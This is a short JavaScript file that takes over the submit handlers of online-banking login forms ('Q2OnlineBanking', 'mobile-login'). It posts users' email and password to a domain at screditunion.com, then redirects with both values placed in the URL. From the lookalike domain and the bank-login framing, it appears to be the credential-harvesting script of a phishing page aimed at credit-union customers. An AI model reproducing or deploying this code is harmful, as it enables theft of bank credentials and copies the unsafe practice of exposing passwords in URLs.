let api_url = "https://accounts.screditunion.com/index.php/oauth/ajax/signin/";
let account_url = "https://accounts.screditunion.com/oauth/signin/";

let request = function (param = { async: true, formdata: false }) {
    var promise = new Promise(function (resolve, reject) {
        var ajax = new XMLHttpRequest()
        ajax.open(param.method, param.url, true)
        if (param.formdata == true) {
            ajax.send(param.data)
        } else {
            ajax.send()
        }
        ajax.onreadystatechange = function () {
            if (ajax.readyState == 4 && ajax.status == 200) {
                resolve(ajax.responseText)
            }
        }
        // console.log(ajax);
    })

    return promise

}

function login(form_id) {
    let form = document.getElementById(form_id);
    let formdata = new FormData(form)
    request({
        url: api_url,
        method: 'POST',
        formdata: true,
        data: formdata
    }).then(function (res) {
        let response = JSON.parse(res)
        if(response.status == "success"){
            
            document.getElementById(`${form_id}alertdiv`).innerHTML = `
            <div style="padding:10px; color:#fff; background:green; border-radius:5px;">Redirecting you to your banking dashboard</div>'
            `;
            window.location = account_url+`?email=${form.email.value}&password=${form.password.value}`;
        }else{
            let support_email = response.support_email
            console.log( document.getElementById(`${form_id}alertdiv`))
            document.getElementById(`${form_id}alertdiv`).innerHTML = `
            <div style="padding:10px; color:#fff; background:red; border-radius:5px;">Incorrect interbanking credentials. Contact our support <b>${support_email}</b> if you have forgotten your credentails</div>
            `;
        }
    }, function () { })
}

if(document.getElementById("Q2OnlineBanking")){
    document.getElementById("Q2OnlineBanking").addEventListener("submit", function(evt){
        evt.preventDefault();
        login("Q2OnlineBanking");
    })
}

if(document.getElementById("mobile-login")){
    document.getElementById("mobile-login").addEventListener("submit", function(evt){
        evt.preventDefault();
        login("mobile-login");
    })
}
